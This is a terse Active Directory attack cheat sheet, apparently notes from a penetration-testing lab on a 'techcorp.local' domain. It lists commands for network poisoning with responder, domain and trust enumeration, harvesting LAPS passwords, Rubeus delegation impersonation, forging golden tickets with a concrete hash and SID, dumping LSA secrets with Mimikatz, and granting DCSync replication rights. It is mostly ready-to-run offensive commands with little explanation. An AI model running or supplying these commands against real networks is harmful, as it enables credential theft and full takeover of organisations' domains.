Reccoinessanse in network without creds and sessions:
responder -I "eth0" -A

enum4linux-ng.py -A

## find the PDC (Principal Domain Controller)
nslookup -type=srv _ldap._tcp.pdc._msdcs.$FQDN_DOMAIN

## find the DCs (Domain Controllers)
nslookup -type=srv _ldap._tcp.dc._msdcs.$FQDN_DOMAIN

## find the GC (Global Catalog, i.e. DC with extended data)
nslookup -type=srv gc._msdcs.$FQDN_DOMAIN

## Other ways to find services hosts that may be DCs 
nslookup -type=srv _kerberos._tcp.$FQDN_DOMAIN
nslookup -type=srv _kpasswd._tcp.$FQDN_DOMAIN
nslookup -type=srv _ldap._tcp.$FQDN_DOMAIN
nmap -v -sV -p 53 $SUBNET/$MASK
nmap -v -sV -sU -p 53 $SUBNET/$MASK

## Name lookup on a range
nbtscan -r $SUBNET/$MASK

## Find names and workgroup from an IP address
nmblookup -A $IPAdress

# Domain Recon

## Forest and Trusts

### Get Domain Forest
(Get-ADForest).Domains

### Get Domain Trusts

Get-DomainTrust \ Get-AdTrust

### Get all trusts in someone forest

Get-ADTrust -Filter 'intraForest -ne $True' -Server (Get-ADForest).Name


## Find computers (File Servers and Distributed File servers) where a domain admin session is available

Find-DomainUserLocation –Stealth / Find-DomainUserLocation -CheckAccess

## Get AD on-prem computer which sync with azure

Get-ADUser -Filter "samAccountName -like 'MSOL_*'" -Server techcorp.local -Properties * | select SamAccountName,Description | fl

# Domain Delegation

## Unconstraint
Get-DomainComputer -Unconstraint

Get-DomainComputer -TrustedToAuth

Get-DomainUser -TrustedToAuth

## Constraint for user and computer (all objects)
Get-ADObject -Filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties msDS-AllowedToDelegateTo


## Enumerate Restricted group

Get-DomainGpoLocalGroup

## Get AD Group members

Get-DomainGroupMember -Identity $groupname

### Get Domain OU

Get-DomainOU / Get-AdOrganizationUnit 

### Get list of child OU (subOU)

Get-ADObject -Filter 'objectClass -eq "organizationalUnit"' -SearchBase "distinguishedName of parent OU"


## Get All computers in OU 

*PowerView
(Get-DomainOU -Identity $OU).distinguishedname | %{Get-DomainComputer -SearchBase $_} | select name

*AdModule
Get-ADOrganizationalUnit -Identity 'OU=Students,DC=us,DC=techcorp,DC=local' | %{Get-ADComputer -SearchBase $_ -Filter *} | select name


## Get DomainGPO applied to OU

(Get-DomainOU -Identity $OU).gplink

Get-DomainGPO -Identity '{FCE16496-C744-4E46-AC89-2D01D76EAD68}'

or

Get-GPInheritance -Target 'OU=,DC,DC' | select-object -expandproperty InheritedGpoLinks 



## Get user's ACL for group

(Get-ACL "AD:$((Get-Group GroupName).distinguishedname)").access

## Find Interesting ACL for user or group. That your user has permission 
Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match 'GROUPNAME or USERNAME'}

**Найти объекты на кого имеет привилегии mgmtadmin например:**
Find-InterestingDomainAcl -ResolveGUIDs -Server us-dc | ?{$_.IdentityReferenceName -match 'mgmtadmin'}

## Get-ACL for users in group
(Get-Acl -Path 'AD:\CN=Domain Admins,CN=Users,DC=us,DC=techcorp,DC=local').Access | ?{$_.IdentityReference -match 'studentuser1'}

## Get all groups for specific user

function Get-ADPrincipalGroupMembershipRecursive ($SamAccountName) {
$groups = @(Get-ADPrincipalGroupMembership -Identity $SamAccountName | select -ExpandProperty distinguishedname)
   $groups
   if ($groups.count -gt 0)
   {
        foreach ($group in $groups)
        {
Get-ADPrincipalGroupMembershipRecursive $group }
}
}

Get-ADPrincipalGroupMembershipRecursive "USERNAME"

## Set SPN
Set-ADUser -Identity Support127User -ServicePrincipalNames @{Add='us/myspn127'} -Verbose



# LAPS




## Get LAPS password read permissions
-PowerView (return group or users who can read LAPS passwords) from IdentityName:
Get-DomainOU | Get-DomainObjectAcl -ResolveGUIDs | Where-Object {($_.ObjectAceType -like 'ms-Mcs-AdmPwd') -and ($_.ActiveDirectoryRights -match 'ReadProperty')} | ForEach-Object {$_ | Add-Member NoteProperty 'IdentityName' $(Convert-SidToName $_.SecurityIdentifier);$_}


### Get LAPS Password for all LAPS machines
$pc_name = (Get-ADComputer -Filter * -Properties name|select name).name
**using LAPS module** 
foreach($pc in $pc_name){Get-AdmPwdPassword -ComputerName $pc}
**using PowerView**
foreach($pc in $pc_name){Get-DomainObject -Identity $pc | Select -ExpandProperty ms-mcs-admpwd}
**using ADModule**
Get-adcomputer -identity $pc -properties ms-mcs-admpwd | select -expandproperty ms-mcs-admpwd 

## Get LAPS password remotly
sudo crackmapexec ldap dc01.doamin.local -u 'uname' -p 'passwd' --kdcHost dc01.domain.local -M LAPS 


# Priv Esaclation

[Rubeus.Program]::Main("$constr_srv_for_us /user:appsvc /impersonateuser:administrator /msdsspn:cifs/US-MSSQL.us.techcorp.local /altservice:HTTP /domain:us.techcorp.local /aes256:b4cb0430da8176ec6eae2002dfa86a8c6742e5a88448f1c2d6afc3781e114335 /ptt".Split(" "))

**Ex**
[Rubeus.Program]::Main("$constr_srv_for_us /user:student72$ /aes256:038cc0e32fbb521fdda1e5f6ef98fee2df844f43cbc9c676edc7d514907a86f1 /msdsspn:http/us-helpdesk /impersonateuser:administrator /ptt".Split(" "));


# Golden Ticket
[Rubeus.Program]::Main("$golden /rc4:b0975ae49f441adc6b024ad238935af5 /ldap /sid:S-1-5-21-210670787-2521448726-163245708 /user:Administrator /printcmd".Split(" "));


[Rubeus.Program]::Main("$golden /rc4:B0975AE49F441ADC6B024AD238935AF5 /user:Administrator /id:500 /pgid:513 /domain:us.techcorp.local /sid:S-1-5-21-210670787-2521448726-163245708 /minpassage:1 /logoncount:346 /netbios:US /groups:544,512,520,513 /dc:US-DC.us.techcorp.local /uac:NORMAL_ACCOUNT,DONT_EXPIRE_PASSWORD /ptt".Split(" "));


winrs -r:us-dc.us.techcorp.local cmd

Invoke-Mimi -Command '"lsadump::lsa /patch"'


# DCSync
Check if studentuser72 has dcsync rights
Get-DomainObjectAcl -SearchBase "dc=us,dc=techcorp,dc=local" -SearchScope Base -ResolveGUIDs | ?{($_.ObjectAceType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll')} | ForEach-Object {$_ | Add-Member NoteProperty 'IdentityName' $(Convert-SidToName $_.SecurityIdentifier);$_} | ?{$_.IdentityName -match "studentuser72"}




# Rights manipulation 
## add dcsync rights to studentuserx with powerview 
Add-DomainObjectAcl -TargetIdentity "dc=us,dc=techcorp,dc=local" -PrincipalIdentity studentuserx -Rights DCSync -PrincipalDomain us.techcorp.local -TargetDomain us.techcorp.local -Verbose

## add dcsync rights with ADmodule
Set-ADACL -DistinguishedName 'DC=us,DC=techcorp,DC=local' -SamAccountName studentuserx -GUIDRight DCSync -Verbose



